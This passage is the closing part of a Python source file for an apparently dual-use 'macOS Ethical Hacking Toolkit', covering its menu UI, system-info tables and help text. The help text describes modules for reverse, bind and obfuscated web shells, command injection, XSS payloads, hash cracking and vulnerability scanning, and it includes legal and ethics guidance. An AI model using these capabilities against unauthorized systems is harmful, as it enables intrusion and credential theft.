            title="Network Interfaces",
            show_header=True,
            header_style=f"bold {NordColors.FROST_1}",
        )
        network_table.add_column("Interface", style=f"bold {NordColors.FROST_2}")
        network_table.add_column("IP Address", style=NordColors.SNOW_STORM_1)

        for iface, ip in network_interfaces.items():
            network_table.add_row(iface, ip)

        console.print(network_table)

    # Display disk usage
    if disk_usage:
        disk_table = Table(
            title="Disk Usage",
            show_header=True,
            header_style=f"bold {NordColors.FROST_1}",
        )
        disk_table.add_column("Property", style=f"bold {NordColors.FROST_2}")
        disk_table.add_column("Value", style=NordColors.SNOW_STORM_1)

        for key, value in disk_usage.items():
            disk_table.add_row(key, value)

        console.print(disk_table)

    # Toolkit statistics
    stats = {
        "Results Files": len(list(RESULTS_DIR.glob("*.*"))),
        "Payload Files": len(list(PAYLOADS_DIR.glob("*.*"))),
        "Wordlist Files": len(list(WORDLISTS_DIR.glob("*.txt"))),
        "Total Files": len(list(BASE_DIR.glob("**/*")))
    }

    stats_table = Table(
        title="Toolkit Statistics",
        show_header=True,
        header_style=f"bold {NordColors.FROST_1}",
    )
    stats_table.add_column("Metric", style=f"bold {NordColors.FROST_2}")
    stats_table.add_column("Count", style=NordColors.SNOW_STORM_1)

    for key, value in stats.items():
        stats_table.add_row(key, str(value))

    console.print(stats_table)


def help_module():
    console.clear()
    console.print(create_header())
    display_panel(
        "Help & Documentation",
        "Documentation and instructions for the toolkit.",
        NordColors.FROST_1
    )

    sections = [
        {"name": "Overview", "id": "overview"},
        {"name": "Network Scanning", "id": "network"},
        {"name": "Web Vulnerabilities", "id": "web"},
        {"name": "OSINT Gathering", "id": "osint"},
        {"name": "Password Tools", "id": "password"},
        {"name": "Payload Generation", "id": "payload"},
        {"name": "Tool Management", "id": "tools"},
        {"name": "Settings", "id": "settings"},
        {"name": "Legal & Ethics", "id": "legal"}
    ]

    options = [(str(i), section["name"], f"View {section['name']} documentation") for i, section in
               enumerate(sections, 1)]
    options.append(("0", "Return", "Return to Main Menu"))

    console.print(create_menu_table("Documentation Sections", options))

    choice = get_integer_input("Select a section", 0, len(sections))
    if choice == 0:
        return

    selected_section = sections[choice - 1]["id"]
    display_help_section(selected_section)

    input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")


def display_help_section(section_id):
    help_content = {
        "overview": """
# macOS Ethical Hacking Toolkit

This toolkit provides a collection of security testing tools and utilities designed specifically for macOS.

## Purpose

The toolkit is designed for:
- Security professionals conducting authorized security assessments
- System administrators performing security audits
- Security researchers testing their own systems
- Educational purposes to learn about security concepts

## Features

- Network scanning and enumeration
- Web vulnerability scanning
- OSINT (Open Source Intelligence) gathering
- Password utilities (generation, hashing, cracking)
- Payload generation for security testing
- Management of security tools

## Requirements

- macOS operating system
- Python 3.7 or higher
- Homebrew package manager (automatically installed if needed)
- Various security tools (can be installed through the toolkit)

## Usage

Navigate through the menus to access different modules and features. Each module provides specific functionality for security testing.

## Important Note

This toolkit should only be used on systems you own or have explicit permission to test. Unauthorized testing is illegal and unethical.
""",

        "network": """
# Network Scanning Module

This module provides tools for discovering hosts, open ports, and services on a network.

## Features

1. **Ping Sweep**: Discover active hosts on a network by sending ICMP echo requests.
   - Input a subnet (e.g., 192.168.1.0/24) to scan for active hosts.

2. **Port Scan**: Identify open ports on a target system.
   - Multiple scan types: TCP Connect, TCP SYN, and Scapy-based scans.
   - Scan specific port ranges or common ports.

3. **Nmap Integration**: Full-featured network scanning using Nmap.
   - Various scan types: fast scan, comprehensive scan, OS detection, and vulnerability scanning.
   - Customizable scan options.

4. **Service Fingerprinting**: Identify services running on open ports.
   - Determine service versions and details.
   - Uses both basic socket connections and Nmap for more accurate results.

5. **OS Detection**: Attempt to identify the operating system of target hosts.
   - Nmap OS detection with accuracy ratings.
   - TCP/IP stack fingerprinting techniques.

## Usage Tips

- Start with a ping sweep to identify active hosts before port scanning.
- Use TCP Connect scans for regular users, or TCP SYN for more stealth (requires root).
- Service fingerprinting helps identify vulnerable service versions.
- Save scan results for later analysis or reporting.

## Tools Used

- Built-in Python networking libraries
- Nmap (if installed)
- Scapy (if installed)
""",

        "web": """
# Web Vulnerability Scanning Module

This module provides tools for identifying vulnerabilities in web applications and servers.

## Features

1. **Nikto Scan**: Web server vulnerability scanner.
   - Identifies known vulnerabilities in web servers.
   - Checks for misconfigurations and outdated software.

2. **SQLMap Integration**: SQL injection vulnerability scanner.
   - Tests for SQL injection vulnerabilities in web applications.
   - Various levels of testing (1-5) for thorough assessment.

3. **Directory Bruteforce**: Discover hidden directories and files.
   - Multiple tools supported: gobuster, ffuf, dirb.
   - Customizable wordlists for different targets.

4. **Basic XSS Check**: Simple cross-site scripting vulnerability testing.
   - Tests URL parameters for XSS vulnerabilities.
   - Multiple payload types for comprehensive testing.

5. **SSL/TLS Analysis**: Check for SSL/TLS vulnerabilities.
   - Certificate information and expiration dates.
   - Cipher suite analysis and known vulnerabilities.

## Usage Tips

- Start with a Nikto scan for a general overview of web server vulnerabilities.
- Use directory bruteforcing to discover hidden content.
- For suspected SQL injection, use SQLMap with appropriate parameters.
- Always verify vulnerabilities manually to confirm results.

## Tools Used

- Nikto (if installed)
- SQLMap (if installed)
- gobuster, ffuf, or dirb (if installed)
- OpenSSL and Nmap for SSL/TLS scanning
""",

        "osint": """
# OSINT Gathering Module

This module provides tools for collecting open-source intelligence about targets.

## Features

1. **Domain Intelligence**: Gather information about domains.
   - WHOIS information and registration details.
   - DNS records and nameservers.
   - SSL certificate information.
   - Subdomain enumeration.

2. **IP Intelligence**: Gather information about IP addresses.
   - Geolocation and ISP information.
   - Reverse DNS lookup.
   - Open ports and services.

3. **Email Intelligence**: Find information related to email addresses.
   - Domain information for the email provider.
   - MX record verification.
   - Email format validation.

4. **Username Search**: Search for usernames across platforms.
   - Checks multiple social media and developer platforms.
   - Identifies platform presence for further investigation.

5. **DNS Reconnaissance**: Advanced DNS queries.
   - Multiple record types (A, AAAA, MX, TXT, etc.).
   - Detailed DNS information for security analysis.

## Usage Tips

- Start with domain intelligence for a comprehensive overview.
- Username search can reveal cross-platform presence.
- Email intelligence helps verify valid email addresses.
- Always respect privacy and terms of service when gathering OSINT.

## Legal Considerations

- Only collect publicly available information.
- Do not use OSINT techniques for stalking or harassment.
- Some platforms prohibit automated data collection in their terms of service.
""",

        "password": """
# Password Tools Module

This module provides utilities for password generation, hashing, and cracking.

## Features

1. **Generate Password**: Create secure random passwords.
   - Multiple complexity levels.
   - Customizable length and character sets.
   - Batch generation for multiple passwords.

2. **Hash Password**: Generate cryptographic hashes from passwords.
   - Multiple hash algorithms (MD5, SHA1, SHA256, etc.).
   - Optional salt for enhanced security.
   - Hash visualization and storage.

3. **Crack Hash (Hashcat)**: Attempt to crack password hashes.
   - Dictionary-based attacks.
   - Brute force attacks with customizable character sets.
   - Integration with Hashcat (if installed).

4. **Dictionary Generator**: Create custom wordlists.
   - Name-based variations.
   - Pattern-based generation.
   - Combination of existing wordlists.

## Usage Tips

- Use the highest complexity level for generating secure passwords.
- Always use salted hashes for storing passwords.
- Dictionary attacks are faster but less comprehensive than brute force.
- Customize wordlists for more effective cracking attempts.

## Security Considerations

- Password cracking should only be performed on systems you own or have permission to test.
- Weak password hashing algorithms (like MD5) should be avoided in production systems.
- Strong passwords should be at least 12 characters with mixed character types.
""",

        "payload": """
# Payload Generation Module

This module provides utilities for generating various security testing payloads.

## Features

1. **Reverse Shell**: Generate reverse shell payloads.
   - Multiple platforms: bash, python, perl, php, and more.
   - Customizable IP and port settings.
   - Executable payloads for different environments.

2. **Web Shell**: Generate web-based shells.
   - Multiple platforms: PHP, JSP, ASPX, and Perl.
   - Command execution capabilities.
   - Minimal and obfuscated options.

3. **Bind Shell**: Generate bind shell payloads.
   - Similar platforms as reverse shells.
   - Customizable port settings.
   - Useful when reverse connections are not possible.

4. **Command Injection**: Generate command injection payloads.
   - Unix and Windows target platforms.
   - Various injection techniques.
   - Encoding and obfuscation options.

5. **XSS Payloads**: Generate cross-site scripting payloads.
   - Multiple categories: basic, alert, img, svg, etc.
   - Encoded variants for bypass techniques.
   - Customizable for different contexts.

## Usage Tips

- Reverse shells are useful when you can receive connections from the target.
- Bind shells are useful when you can initiate connections to the target.
- Web shells require web server access to deploy.
- Always test payloads in controlled environments first.

## Legal Considerations

- These payloads should only be used for authorized security testing.
- Unauthorized use of these payloads may violate computer crime laws.
- Always have explicit permission before deploying payloads on any system.
""",

        "tools": """
# Tool Management Module

This module helps manage and install various security tools on your macOS system.

## Features

1. **Show Installed Tools**: View status of security tools.
   - Organized by category.
   - Shows installation status for each tool.
   - Provides descriptions and information.

2. **Install Tools**: Install missing security tools.
   - Batch installation of multiple tools.
   - Category-based installation.
   - Uses Homebrew, pip, and other package managers.

3. **Update Tools**: Update installed tools to latest versions.
   - Update Homebrew packages.
   - Update Python packages.
   - Keep all tools current for best security testing.

4. **Manage Homebrew**: Install and update Homebrew package manager.
   - Homebrew installation if not present.
   - Package updates and cleanup.
   - General Homebrew maintenance.

## Included Tools

This toolkit can help you manage a variety of security tools across categories:

- **Network**: nmap, wireshark, tcpdump, masscan
- **Web**: burpsuite, sqlmap, nikto, ffuf, gobuster
- **Forensics**: binwalk
- **Crypto**: hashcat, john
- **Recon**: amass, subfinder, theharvester
- **Exploitation**: metasploit, hydra
- **Reverse Engineering**: radare2

## Usage Tips

- Check tool status before running security tests.
- Install specific tools for specific testing needs.
- Update tools regularly for the latest security features.
- Use Homebrew for most tool installations on macOS.
""",

        "settings": """
# Settings Module

This module allows configuration and management of toolkit settings and data.

## Features

1. **Configuration**: Modify application settings.
   - Default threads for parallel operations.
   - Default timeout for operations.
   - User agent settings for web requests.

2. **Manage Results**: View, export, or delete scan results.
   - Browse results by type or search for specific results.
   - Export to different formats (CSV, HTML, Text).
   - Delete old or unnecessary results.

3. **Manage Payloads**: View, export, or delete payloads.
   - Browse generated payloads.
   - Export to external locations.
   - Delete old payloads.

4. **Manage Wordlists**: Add, edit, or delete wordlists.
   - Create custom wordlists.
   - Edit existing wordlists.
   - Import wordlists from external sources.

5. **System Information**: View system and toolkit information.
   - OS version and hardware details.
   - Network interfaces and configurations.
   - Toolkit statistics and status.

## Usage Tips

- Increase thread count on powerful systems for faster operations.
- Export results to HTML for easy sharing and reporting.
- Create custom wordlists for specific target environments.
- Regularly clean up old results to save disk space.
""",

        "legal": """
# Legal & Ethical Considerations

This toolkit is designed for legitimate security testing and educational purposes only. Misuse of these tools may violate laws and regulations.

## Important Guidelines

1. **Authorization**: Only use these tools on systems you own or have explicit permission to test.

2. **Scope**: Respect the agreed-upon scope for security testing. Going beyond the scope may be illegal.

3. **Data Privacy**: Respect privacy rights. Do not access, store, or expose personal data without authorization.

4. **Documentation**: Maintain detailed records of your security testing activities.

5. **Disclosure**: Follow responsible disclosure practices for any vulnerabilities discovered.

## Legal Framework

Laws governing computer security testing vary by country and jurisdiction. Common legal frameworks include:

- Computer Fraud and Abuse Act (CFAA) in the United States
- Computer Misuse Act in the United Kingdom
- Similar cybercrime laws in other countries

## Ethical Considerations

- Avoid causing harm or disruption to systems or services.
- Do not use security tools for personal gain or unauthorized access.
- Report vulnerabilities responsibly to the system owners.
- Do not share access credentials or sensitive information discovered during testing.

## Disclaimer

The authors of this toolkit are not responsible for any misuse or illegal activities conducted with these tools. Users are solely responsible for their actions and must ensure they comply with all applicable laws and regulations.
"""
    }

    if section_id in help_content:
        console.print(Markdown(help_content[section_id]))
    else:
        print_error(f"Help section '{section_id}' not found")


def cleanup():
    try:
        print_message("Cleaning up resources...", NordColors.FROST_3)
        config = load_config()
        save_config(config)
    except Exception as e:
        print_error(f"Error during cleanup: {e}")


def signal_handler(sig, frame):
    try:
        sig_name = signal.Signals(sig).name
        print_warning(f"Process interrupted by {sig_name}")
    except Exception:
        print_warning(f"Process interrupted by signal {sig}")
    cleanup()
    sys.exit(128 + sig)


signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)
atexit.register(cleanup)


def display_main_menu():
    console.clear()
    console.print(create_header())
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    console.print(
        Align.center(
            f"[{NordColors.SNOW_STORM_1}]Time: {current_time}[/] | [{NordColors.SNOW_STORM_1}]Host: {HOSTNAME}[/]"
        )
    )
    console.print()

    options = [
        ("1", "Network Scanning", "Discover hosts, open ports and services"),
        ("2", "Web Vulnerability Scanning", "Scan for web application vulnerabilities"),
        ("3", "OSINT Gathering", "Collect open-source intelligence"),
        ("4", "Password Tools", "Generate and crack passwords"),
        ("5", "Payload Generation", "Create security testing payloads"),
        ("6", "Tool Management", "Install and manage security tools"),
        ("7", "Settings", "Configure application settings"),
        ("8", "Help", "View documentation and instructions"),
        ("0", "Exit", "Exit the application")
    ]

    console.print(create_menu_table("Main Menu", options))


def main():
    try:
        print_message(f"Starting {APP_NAME} v{VERSION}", NordColors.GREEN)

        while True:
            display_main_menu()
            choice = get_integer_input("Enter your choice", 0, 8)

            if choice == 0:
                console.clear()
                console.print(
                    Panel(
                        Text(f"Thank you for using {APP_NAME}!", style=f"bold {NordColors.FROST_2}"),
                        border_style=NordColors.FROST_1,
                        padding=(1, 2),
                    )
                )
                print_message("Exiting application", NordColors.FROST_3)
                break
            elif choice == 1:
                network_scanning_module()
            elif choice == 2:
                web_vulnerability_module()
            elif choice == 3:
                osint_module()
            elif choice == 4:
                password_tools_module()
            elif choice == 5:
                payload_generation_module()
            elif choice == 6:
                tool_management_module()
            elif choice == 7:
                settings_module()
            elif choice == 8:
                help_module()
    except KeyboardInterrupt:
        print_warning("Operation cancelled by user")
        display_panel("Operation cancelled", NordColors.YELLOW, "Cancelled")
        sys.exit(0)
    except Exception as e:
        print_error(f"Unhandled error: {e}")
        display_panel(f"Unhandled error: {e}", NordColors.RED, "Error")
        console.print_exception()
        sys.exit(1)


if __name__ == "__main__":
    main()